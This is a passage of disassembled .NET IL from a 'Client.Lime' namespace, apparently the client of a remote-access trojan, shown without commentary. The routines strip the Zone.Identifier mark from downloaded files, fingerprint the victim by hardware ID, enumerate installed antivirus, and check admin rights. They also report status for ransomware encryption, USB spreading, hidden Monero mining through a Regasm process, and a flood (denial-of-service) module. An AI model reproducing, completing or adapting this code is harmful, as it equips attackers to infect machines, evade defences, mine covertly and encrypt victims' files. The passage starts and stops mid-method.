          bool  marshal( bool)  DeleteFile(string  marshal( lptstr) filepath) cil managed preservesig
  {
  }
  .method public static void  DeleteZoneIdentifier(string filePath) cil managed
  {
    // Code size       32 (0x20)
    .maxstack  2
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  ldstr      ":Zone.Identifier"
      IL_0006:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_000b:  call       bool Client.Lime.C_Fuctions::DeleteFile(string)
      IL_0010:  pop
      IL_0011:  leave.s    IL_001f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0013:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0018:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_001d:  leave.s    IL_001f

    }  // end handler
    IL_001f:  ret
  } // end of method C_Fuctions::DeleteZoneIdentifier

} // end of class Client.Lime.C_Fuctions

.class public auto ansi beforefieldinit Client.Lime.C_ID
       extends [mscorlib]System.Object
{
  .field private static object SPL
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     string Client.Lime.C_Settings::SPL
    IL_0005:  stsfld     object Client.Lime.C_ID::SPL
    IL_000a:  ret
  } // end of method C_ID::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method C_ID::.ctor

  .method public static object  Bot() cil managed
  {
    // Code size       50 (0x32)
    .maxstack  2
    .locals init (object V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  call       object Client.Lime.C_ID::UserName()
      IL_0005:  ldstr      "_"
      IL_000a:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_000f:  call       string Client.Lime.C_ID::HWID()
      IL_0014:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0019:  stloc.0
      IL_001a:  leave.s    IL_0030

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_001c:  dup
      IL_001d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0022:  stloc.1
      IL_0023:  ldstr      "Error"
      IL_0028:  stloc.0
      IL_0029:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_002e:  leave.s    IL_0030

    }  // end handler
    IL_0030:  ldloc.0
    IL_0031:  ret
  } // end of method C_ID::Bot

  .method public static object  UserName() cil managed
  {
    // Code size       30 (0x1e)
    .maxstack  2
    .locals init (object V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  call       string [mscorlib]System.Environment::get_UserName()
      IL_0005:  stloc.0
      IL_0006:  leave.s    IL_001c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0008:  dup
      IL_0009:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_000e:  stloc.1
      IL_000f:  ldstr      "Error"
      IL_0014:  stloc.0
      IL_0015:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_001a:  leave.s    IL_001c

    }  // end handler
    IL_001c:  ldloc.0
    IL_001d:  ret
  } // end of method C_ID::UserName

  .method public static object  MyOS() cil managed
  {
    // Code size       130 (0x82)
    .maxstack  3
    .locals init (object V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  call       class Client.My.MyComputer Client.My.MyProject::get_Computer()
      IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Info()
      IL_000a:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo::get_OSFullName()
      IL_000f:  ldstr      "Microsoft"
      IL_0014:  ldstr      ""
      IL_0019:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_001e:  ldstr      "Windows"
      IL_0023:  ldstr      "Win"
      IL_0028:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_002d:  ldstr      bytearray (AE 00 ) 
      IL_0032:  ldstr      ""
      IL_0037:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_003c:  ldstr      bytearray (22 21 )                                           // "!
      IL_0041:  ldstr      ""
      IL_0046:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_004b:  ldstr      "  "
      IL_0050:  ldstr      " "
      IL_0055:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_005a:  ldstr      " Win"
      IL_005f:  ldstr      "Win"
      IL_0064:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0069:  stloc.0
      IL_006a:  leave.s    IL_0080

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_006c:  dup
      IL_006d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0072:  stloc.1
      IL_0073:  ldstr      "Unkown"
      IL_0078:  stloc.0
      IL_0079:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_007e:  leave.s    IL_0080

    }  // end handler
    IL_0080:  ldloc.0
    IL_0081:  ret
  } // end of method C_ID::MyOS

  .method public static object  Bit() cil managed
  {
    // Code size       60 (0x3c)
    .maxstack  2
    .locals init (object V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  ldstr      "PROCESSOR_ARCHITECTURE"
      IL_0005:  call       string [mscorlib]System.Environment::GetEnvironmentVariable(string)
      IL_000a:  ldstr      "64"
      IL_000f:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0014:  brfalse.s  IL_001e

      IL_0016:  ldstr      "x64"
      IL_001b:  stloc.0
      IL_001c:  leave.s    IL_003a

      IL_001e:  ldstr      "x86"
      IL_0023:  stloc.0
      IL_0024:  leave.s    IL_003a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0026:  dup
      IL_0027:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_002c:  stloc.1
      IL_002d:  ldstr      "*"
      IL_0032:  stloc.0
      IL_0033:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0038:  leave.s    IL_003a

    }  // end handler
    IL_003a:  ldloc.0
    IL_003b:  ret
  } // end of method C_ID::Bit

  .method public static string  INDATE() cil managed
  {
    // Code size       53 (0x35)
    .maxstack  2
    .locals init (string V_0,
             valuetype [mscorlib]System.DateTime V_1,
             class [mscorlib]System.Exception V_2)
    .try
    {
      IL_0000:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_0005:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
      IL_000a:  callvirt   instance valuetype [mscorlib]System.DateTime [mscorlib]System.IO.FileSystemInfo::get_LastWriteTime()
      IL_000f:  stloc.1
      IL_0010:  ldloca.s   V_1
      IL_0012:  ldstr      "dd/MM/yyy"
      IL_0017:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_001c:  stloc.0
      IL_001d:  leave.s    IL_0033

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_001f:  dup
      IL_0020:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0025:  stloc.2
      IL_0026:  ldstr      "Error"
      IL_002b:  stloc.0
      IL_002c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0031:  leave.s    IL_0033

    }  // end handler
    IL_0033:  ldloc.0
    IL_0034:  ret
  } // end of method C_ID::INDATE

  .method public static string  HWID() cil managed
  {
    // Code size       120 (0x78)
    .maxstack  4
    .locals init (string V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  ldstr      "Win32_Processor"
      IL_0005:  ldstr      "ProcessorId"
      IL_000a:  call       string Client.Lime.C_ID::Identifier(string,
                                                               string)
      IL_000f:  ldstr      "-"
      IL_0014:  ldstr      "Win32_BIOS"
      IL_0019:  ldstr      "SerialNumber"
      IL_001e:  call       string Client.Lime.C_ID::Identifier(string,
                                                               string)
      IL_0023:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0028:  ldstr      "-"
      IL_002d:  ldstr      "Win32_BaseBoard"
      IL_0032:  ldstr      "SerialNumber"
      IL_0037:  call       string Client.Lime.C_ID::Identifier(string,
                                                               string)
      IL_003c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0041:  ldstr      "-"
      IL_0046:  ldstr      "Win32_VideoController"
      IL_004b:  ldstr      "Name"
      IL_0050:  call       string Client.Lime.C_ID::Identifier(string,
                                                               string)
      IL_0055:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_005a:  call       string Client.Lime.C_ID::MD5HASH(string)
      IL_005f:  stloc.0
      IL_0060:  leave.s    IL_0076

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0062:  dup
      IL_0063:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0068:  stloc.1
      IL_0069:  ldstr      "Error"
      IL_006e:  stloc.0
      IL_006f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0074:  leave.s    IL_0076

    }  // end handler
    IL_0076:  ldloc.0
    IL_0077:  ret
  } // end of method C_ID::HWID

  .method private static string  Identifier(string wmiClass,
                                            string wmiProperty) cil managed
  {
    // Code size       129 (0x81)
    .maxstack  3
    .locals init (string V_0,
             string V_1,
             class [System.Management]System.Management.ManagementObjectCollection V_2,
             class [System.Management]System.Management.ManagementObjectCollection/ManagementObjectEnumerator V_3,
             class [System.Management]System.Management.ManagementObject V_4,
             class [mscorlib]System.Exception V_5)
    .try
    {
      IL_0000:  ldstr      ""
      IL_0005:  stloc.1
      IL_0006:  ldarg.0
      IL_0007:  newobj     instance void [System.Management]System.Management.ManagementClass::.ctor(string)
      IL_000c:  callvirt   instance class [System.Management]System.Management.ManagementObjectCollection [System.Management]System.Management.ManagementClass::GetInstances()
      IL_0011:  stloc.2
      .try
      {
        IL_0012:  ldloc.2
        IL_0013:  callvirt   instance class [System.Management]System.Management.ManagementObjectCollection/ManagementObjectEnumerator [System.Management]System.Management.ManagementObjectCollection::GetEnumerator()
        IL_0018:  stloc.3
        IL_0019:  br.s       IL_0052

        IL_001b:  ldloc.3
        IL_001c:  callvirt   instance class [System.Management]System.Management.ManagementBaseObject [System.Management]System.Management.ManagementObjectCollection/ManagementObjectEnumerator::get_Current()
        IL_0021:  castclass  [System.Management]System.Management.ManagementObject
        IL_0026:  stloc.s    V_4
        IL_0028:  ldloc.1
        IL_0029:  ldstr      ""
        IL_002e:  ldc.i4.0
        IL_002f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                          string,
                                                                                                                          bool)
        IL_0034:  brtrue.s   IL_0052

        .try
        {
          IL_0036:  ldloc.s    V_4
          IL_0038:  ldarg.1
          IL_0039:  callvirt   instance object [System.Management]System.Management.ManagementBaseObject::get_Item(string)
          IL_003e:  callvirt   instance string [mscorlib]System.Object::ToString()
          IL_0043:  stloc.1
          IL_0044:  leave.s    IL_005a

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0046:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_004b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0050:  leave.s    IL_0052

        }  // end handler
        IL_0052:  ldloc.3
        IL_0053:  callvirt   instance bool [System.Management]System.Management.ManagementObjectCollection/ManagementObjectEnumerator::MoveNext()
        IL_0058:  brtrue.s   IL_001b

        IL_005a:  leave.s    IL_0066

      }  // end .try
      finally
      {
        IL_005c:  ldloc.3
        IL_005d:  brfalse.s  IL_0065

        IL_005f:  ldloc.3
        IL_0060:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
        IL_0065:  endfinally
      }  // end handler
      IL_0066:  ldloc.1
      IL_0067:  stloc.0
      IL_0068:  leave.s    IL_007f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_006a:  dup
      IL_006b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0070:  stloc.s    V_5
      IL_0072:  ldstr      "Error"
      IL_0077:  stloc.0
      IL_0078:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_007d:  leave.s    IL_007f

    }  // end handler
    IL_007f:  ldloc.0
    IL_0080:  ret
  } // end of method C_ID::Identifier

  .method public static string  MD5HASH(string input) cil managed
  {
    // Code size       113 (0x71)
    .maxstack  3
    .locals init (string V_0,
             uint8[] V_1,
             class [mscorlib]System.Text.StringBuilder V_2,
             int32 V_3,
             int32 V_4,
             class [mscorlib]System.Exception V_5)
    .try
    {
      IL_0000:  newobj     instance void [mscorlib]System.Security.Cryptography.MD5CryptoServiceProvider::.ctor()
      IL_0005:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
      IL_000a:  ldarg.0
      IL_000b:  callvirt   instance uint8[] [mscorlib]System.Text.Encoding::GetBytes(string)
      IL_0010:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::ComputeHash(uint8[])
      IL_0015:  stloc.1
      IL_0016:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor()
      IL_001b:  stloc.2
      IL_001c:  ldloc.1
      IL_001d:  ldlen
      IL_001e:  conv.i4
      IL_001f:  ldc.i4.1
      IL_0020:  sub.ovf
      IL_0021:  stloc.3
      IL_0022:  ldc.i4.s   10
      IL_0024:  stloc.s    V_4
      IL_0026:  br.s       IL_0047

      IL_0028:  ldloc.2
      IL_0029:  ldloc.1
      IL_002a:  ldloc.s    V_4
      IL_002c:  ldelema    [mscorlib]System.Byte
      IL_0031:  ldstr      "x2"
      IL_0036:  call       instance string [mscorlib]System.Byte::ToString(string)
      IL_003b:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
      IL_0040:  pop
      IL_0041:  ldloc.s    V_4
      IL_0043:  ldc.i4.1
      IL_0044:  add.ovf
      IL_0045:  stloc.s    V_4
      IL_0047:  ldloc.s    V_4
      IL_0049:  ldloc.3
      IL_004a:  ble.s      IL_0028

      IL_004c:  ldloc.2
      IL_004d:  callvirt   instance string [mscorlib]System.Text.StringBuilder::ToString()
      IL_0052:  callvirt   instance string [mscorlib]System.String::ToUpper()
      IL_0057:  stloc.0
      IL_0058:  leave.s    IL_006f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_005a:  dup
      IL_005b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0060:  stloc.s    V_5
      IL_0062:  ldstr      "Error"
      IL_0067:  stloc.0
      IL_0068:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_006d:  leave.s    IL_006f

    }  // end handler
    IL_006f:  ldloc.0
    IL_0070:  ret
  } // end of method C_ID::MD5HASH

  .method public static object  Rans() cil managed
  {
    // Code size       78 (0x4e)
    .maxstack  3
    .locals init (object V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  ldstr      "Rans-Status"
      IL_0005:  call       string Client.Lime.C_Fuctions::GTV(string)
      IL_000a:  ldnull
      IL_000b:  ldc.i4.0
      IL_000c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0011:  brtrue.s   IL_002b

      IL_0013:  ldstr      "Rans-Status"
      IL_0018:  ldstr      "Not encrypted"
      IL_001d:  call       object Client.Lime.C_Fuctions::STV(string,
                                                              string)
      IL_0022:  pop
      IL_0023:  ldstr      "Not encrypted"
      IL_0028:  stloc.0
      IL_0029:  leave.s    IL_004c

      IL_002b:  ldstr      "Rans-Status"
      IL_0030:  call       string Client.Lime.C_Fuctions::GTV(string)
      IL_0035:  stloc.0
      IL_0036:  leave.s    IL_004c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0038:  dup
      IL_0039:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003e:  stloc.1
      IL_003f:  ldstr      "Error"
      IL_0044:  stloc.0
      IL_0045:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_004a:  leave.s    IL_004c

    }  // end handler
    IL_004c:  ldloc.0
    IL_004d:  ret
  } // end of method C_ID::Rans

  .method public static object  USBSP() cil managed
  {
    // Code size       118 (0x76)
    .maxstack  3
    .locals init (object V_0,
             class [mscorlib]System.Exception V_1)
    IL_0000:  ldsfld     bool Client.Lime.C_Settings::USB
    IL_0005:  brfalse.s  IL_0058

    .try
    {
      IL_0007:  ldstr      "USB"
      IL_000c:  call       string Client.Lime.C_Fuctions::GTV(string)
      IL_0011:  ldnull
      IL_0012:  ldc.i4.0
      IL_0013:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0018:  brtrue.s   IL_0037

      IL_001a:  ldstr      "USB"
      IL_001f:  ldstr      "Not ready"
      IL_0024:  call       object Client.Lime.C_Fuctions::STV(string,
                                                              string)
      IL_0029:  pop
      IL_002a:  ldstr      "USB"
      IL_002f:  call       string Client.Lime.C_Fuctions::GTV(string)
      IL_0034:  stloc.0
      IL_0035:  leave.s    IL_0074

      IL_0037:  ldstr      "USB"
      IL_003c:  call       string Client.Lime.C_Fuctions::GTV(string)
      IL_0041:  stloc.0
      IL_0042:  leave.s    IL_0074

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0044:  dup
      IL_0045:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004a:  stloc.1
      IL_004b:  ldstr      "Error"
      IL_0050:  stloc.0
      IL_0051:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0056:  leave.s    IL_0074

    }  // end handler
    IL_0058:  ldsfld     bool Client.Lime.C_Settings::USB
    IL_005d:  brtrue.s   IL_006e

    IL_005f:  ldsfld     bool Client.Lime.C_Settings::PIN
    IL_0064:  brtrue.s   IL_006e

    IL_0066:  ldstr      "Disabled"
    IL_006b:  stloc.0
    IL_006c:  br.s       IL_0074

    IL_006e:  ldstr      "Not ready"
    IL_0073:  stloc.0
    IL_0074:  ldloc.0
    IL_0075:  ret
  } // end of method C_ID::USBSP

  .method public static string  AV() cil managed
  {
    // Code size       152 (0x98)
    .maxstack  3
    .locals init (string V_0,
             string V_1,
             class [System.Management]System.Management.ManagementObjectSearcher V_2,
             class [System.Management]System.Management.ManagementObjectCollection V_3,
             class [System.Management]System.Management.ManagementObjectCollection/ManagementObjectEnumerator V_4)
    .try
    {
      IL_0000:  ldnull
      IL_0001:  stloc.1
      IL_0002:  ldstr      "\\\\"
      IL_0007:  call       string [mscorlib]System.Environment::get_MachineName()
      IL_000c:  ldstr      "\\root\\SecurityCenter2"
      IL_0011:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0016:  ldstr      "SELECT * FROM AntivirusProduct"
      IL_001b:  newobj     instance void [System.Management]System.Management.ManagementObjectSearcher::.ctor(string,
                                                                                                              string)
      IL_0020:  stloc.2
      IL_0021:  ldloc.2
      IL_0022:  callvirt   instance class [System.Management]System.Management.ManagementObjectCollection [System.Management]System.Management.ManagementObjectSearcher::Get()
      IL_0027:  stloc.3
      .try
      {
        IL_0028:  ldloc.3
        IL_0029:  callvirt   instance class [System.Management]System.Management.ManagementObjectCollection/ManagementObjectEnumerator [System.Management]System.Management.ManagementObjectCollection::GetEnumerator()
        IL_002e:  stloc.s    V_4
        IL_0030:  br.s       IL_004e

        IL_0032:  ldloc.s    V_4
        IL_0034:  callvirt   instance class [System.Management]System.Management.ManagementBaseObject [System.Management]System.Management.ManagementObjectCollection/ManagementObjectEnumerator::get_Current()
        IL_0039:  castclass  [System.Management]System.Management.ManagementObject
        IL_003e:  ldstr      "displayName"
        IL_0043:  callvirt   instance object [System.Management]System.Management.ManagementBaseObject::get_Item(string)
        IL_0048:  callvirt   instance string [mscorlib]System.Object::ToString()
        IL_004d:  stloc.1
        IL_004e:  ldloc.s    V_4
        IL_0050:  callvirt   instance bool [System.Management]System.Management.ManagementObjectCollection/ManagementObjectEnumerator::MoveNext()
        IL_0055:  brtrue.s   IL_0032

        IL_0057:  leave.s    IL_0065

      }  // end .try
      finally
      {
        IL_0059:  ldloc.s    V_4
        IL_005b:  brfalse.s  IL_0064

        IL_005d:  ldloc.s    V_4
        IL_005f:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
        IL_0064:  endfinally
      }  // end handler
      IL_0065:  ldloc.1
      IL_0066:  ldsfld     string [mscorlib]System.String::Empty
      IL_006b:  ldc.i4.0
      IL_006c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0071:  brtrue.s   IL_0079

      IL_0073:  ldstr      "N/A"
      IL_0078:  stloc.1
      IL_0079:  ldloc.1
      IL_007a:  callvirt   instance string [mscorlib]System.String::ToString()
      IL_007f:  stloc.1
      IL_0080:  ldloc.1
      IL_0081:  stloc.0
      IL_0082:  leave.s    IL_0096

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0084:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0089:  ldstr      "N/A"
      IL_008e:  stloc.0
      IL_008f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0094:  leave.s    IL_0096

    }  // end handler
    IL_0096:  ldloc.0
    IL_0097:  ret
  } // end of method C_ID::AV

  .method public static bool  Privileges() cil managed
  {
    // Code size       50 (0x32)
    .maxstack  2
    .locals init (bool V_0,
             class [mscorlib]System.Security.Principal.WindowsIdentity V_1,
             class [mscorlib]System.Exception V_2)
    .try
    {
      IL_0000:  call       class [mscorlib]System.Security.Principal.WindowsIdentity [mscorlib]System.Security.Principal.WindowsIdentity::GetCurrent()
      IL_0005:  stloc.1
      IL_0006:  ldloc.1
      IL_0007:  newobj     instance void [mscorlib]System.Security.Principal.WindowsPrincipal::.ctor(class [mscorlib]System.Security.Principal.WindowsIdentity)
      IL_000c:  ldc.i4     0x220
      IL_0011:  callvirt   instance bool [mscorlib]System.Security.Principal.WindowsPrincipal::IsInRole(valuetype [mscorlib]System.Security.Principal.WindowsBuiltInRole)
      IL_0016:  brfalse.s  IL_001c

      IL_0018:  ldc.i4.1
      IL_0019:  stloc.0
      IL_001a:  leave.s    IL_0030

      IL_001c:  ldc.i4.0
      IL_001d:  stloc.0
      IL_001e:  leave.s    IL_0030

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0020:  dup
      IL_0021:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0026:  stloc.2
      IL_0027:  ldc.i4.0
      IL_0028:  stloc.0
      IL_0029:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_002e:  leave.s    IL_0030

    }  // end handler
    IL_0030:  ldloc.0
    IL_0031:  ret
  } // end of method C_ID::Privileges

  .method public static string  XMR() cil managed
  {
    // Code size       160 (0xa0)
    .maxstack  2
    .locals init (string V_0,
             string V_1,
             class [System.Management]System.Management.ManagementObjectCollection V_2,
             class [System.Management]System.Management.ManagementObjectCollection/ManagementObjectEnumerator V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5)
    .try
    {
      IL_0000:  ldstr      "Regasm"
      IL_0005:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
      IL_000a:  ldlen
      IL_000b:  conv.i4
      IL_000c:  ldc.i4.0
      IL_000d:  ble.s      IL_0087

      .try
      {
        IL_000f:  ldstr      "select CommandLine from Win32_Process where Name='"
        + "{0}'"
        IL_0014:  ldstr      "Regasm.exe"
        IL_0019:  call       string [mscorlib]System.String::Format(string,
                                                                    object)
        IL_001e:  stloc.1
        IL_001f:  ldloc.1
        IL_0020:  newobj     instance void [System.Management]System.Management.ManagementObjectSearcher::.ctor(string)
        IL_0025:  callvirt   instance class [System.Management]System.Management.ManagementObjectCollection [System.Management]System.Management.ManagementObjectSearcher::Get()
        IL_002a:  stloc.2
        .try
        {
          IL_002b:  ldloc.2
          IL_002c:  callvirt   instance class [System.Management]System.Management.ManagementObjectCollection/ManagementObjectEnumerator [System.Management]System.Management.ManagementObjectCollection::GetEnumerator()
          IL_0031:  stloc.3
          IL_0032:  br.s       IL_0062

          IL_0034:  ldloc.3
          IL_0035:  callvirt   instance class [System.Management]System.Management.ManagementBaseObject [System.Management]System.Management.ManagementObjectCollection/ManagementObjectEnumerator::get_Current()
          IL_003a:  castclass  [System.Management]System.Management.ManagementObject
          IL_003f:  ldstr      "CommandLine"
          IL_0044:  callvirt   instance object [System.Management]System.Management.ManagementBaseObject::get_Item(string)
          IL_0049:  callvirt   instance string [mscorlib]System.Object::ToString()
          IL_004e:  ldstr      "--donate-level="
          IL_0053:  callvirt   instance bool [mscorlib]System.String::Contains(string)
          IL_0058:  brfalse.s  IL_0062

          IL_005a:  ldstr      "Minning..."
          IL_005f:  stloc.0
          IL_0060:  leave.s    IL_009e

          IL_0062:  ldloc.3
          IL_0063:  callvirt   instance bool [System.Management]System.Management.ManagementObjectCollection/ManagementObjectEnumerator::MoveNext()
          IL_0068:  brtrue.s   IL_0034

          IL_006a:  leave.s    IL_0076

        }  // end .try
        finally
        {
          IL_006c:  ldloc.3
          IL_006d:  brfalse.s  IL_0075

          IL_006f:  ldloc.3
          IL_0070:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
          IL_0075:  endfinally
        }  // end handler
        IL_0076:  leave.s    IL_008d

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0078:  dup
        IL_0079:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_007e:  stloc.s    V_4
        IL_0080:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0085:  leave.s    IL_008d

      }  // end handler
      IL_0087:  call       string Client.Lime.C_ID::CPU_GPU()
      IL_008c:  stloc.0
      IL_008d:  leave.s    IL_009e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_008f:  dup
      IL_0090:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0095:  stloc.s    V_5
      IL_0097:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_009c:  leave.s    IL_009e

    }  // end handler
    IL_009e:  ldloc.0
    IL_009f:  ret
  } // end of method C_ID::XMR

  .method public static object  Flood() cil managed
  {
    // Code size       70 (0x46)
    .maxstack  3
    .locals init (object V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  ldstr      "Flood"
      IL_0005:  call       string Client.Lime.C_Fuctions::GTV(string)
      IL_000a:  ldnull
      IL_000b:  ldc.i4.0
      IL_000c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0011:  brtrue.s   IL_0023

      IL_0013:  ldstr      "Flood"
      IL_0018:  ldstr      " "
      IL_001d:  call       object Client.Lime.C_Fuctions::STV(string,
                                                              string)
      IL_0022:  pop
      IL_0023:  ldstr      "Flood"
      IL_0028:  call       string Client.Lime.C_Fuctions::GTV(string)
      IL_002d:  stloc.0
      IL_002e:  leave.s    IL_0044

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0030:  dup
      IL_0031:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0036:  stloc.1
      IL_0037:  ldstr      "Error"
